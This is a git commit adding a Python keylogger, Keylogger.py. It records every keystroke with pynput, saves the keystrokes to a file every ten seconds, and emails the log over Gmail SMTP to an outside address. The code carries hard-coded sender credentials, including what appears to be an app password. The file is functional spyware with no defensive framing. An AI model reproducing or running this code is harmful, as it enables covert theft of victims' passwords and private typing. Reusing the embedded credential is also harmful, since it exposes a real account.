f475ca18f7b99e071621292453ad82d751837a9e
Ritik0302 <ritiksinghania0302@gmail.com>
2024-07-26 13:13:08 +0530

    Initial commit

---
+++ Keylogger.py
@@ -0,0 +1,69 @@
+from pynput import keyboard
+import threading
+import time
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+log_file_path = "keystrokes.txt"
+keystrokes = []
+
+
+smtp_server = "smtp.gmail.com" 
+smtp_port = 587 
+smtp_username = "dragonblade0987@gmail.com"
+smtp_password = "lzcediowhtpjlkho"
+email_from = "dragonblade0987@gmail.com"
+email_to = "whitedevil1902@gmail.com"
+email_subject = "Keystroke Log"
+
+def on_press(key):
+    try:
+        keystrokes.append(f"Key stroke: {key.char}\n")
+    except AttributeError:
+        keystrokes.append(f"Special stroke: {key}\n")
+
+def save_keystrokes():
+    while True:
+        time.sleep(10) 
+        if keystrokes:
+            with open(log_file_path, "a") as file:
+                file.write("".join(keystrokes))
+            keystrokes.clear()
+            send_email()
+
+def send_email():
+    msg = MIMEMultipart()
+    msg['From'] = email_from
+    msg['To'] = email_to
+    msg['Subject'] = email_subject
+
+    body = "Please find the keystroke log attached."
+    msg.attach(MIMEText(body, 'plain'))
+
+    
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f"attachment; filename={log_file_path}")
+        msg.attach(part)
+
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_username, smtp_password)
+    text = msg.as_string()
+    server.sendmail(email_from, email_to, text)
+    server.quit()
+    
+
+def main():
+    save_thread = threading.Thread(target=save_keystrokes, daemon=True)
+    save_thread.start()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
